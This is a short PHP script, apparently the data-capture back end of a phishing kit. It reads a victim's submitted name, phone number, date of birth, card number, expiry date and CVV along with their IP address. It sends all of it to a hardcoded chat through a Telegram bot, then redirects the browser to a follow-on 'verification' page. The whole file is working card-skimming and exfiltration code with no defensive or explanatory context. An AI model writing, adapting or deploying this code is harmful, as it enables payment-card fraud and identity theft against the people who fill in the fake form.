<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------------------------------------\n";
$message .= "First Name   : ".$_POST['a1']."\n";
$message .= "Tele   : ".$_POST['a99']."\n";
$message .= "Day  : ".$_POST['dob']."\n";
$message .= "month   : ".$_POST['mob']."\n";
$message .= "Year   : ".$_POST['yob']."\n";
$message .= "Card Number   : ".$_POST['cc']."\n";
$message .= "exp month   : ".$_POST['a3']."\n";
$message .= "exp year   : ".$_POST['a4']."\n";
$message .= "Cvv   : ".$_POST['cvv']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------------------------------------\n";
$token = "<TOKEN_REMOVED>";
$data = [
    'text' => $message,
    'chat_id' => '5723610400'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

echo '<script language="Javascript">
<!--
document.location.replace("Verifikationn.html");
// -->
</script>';



?>
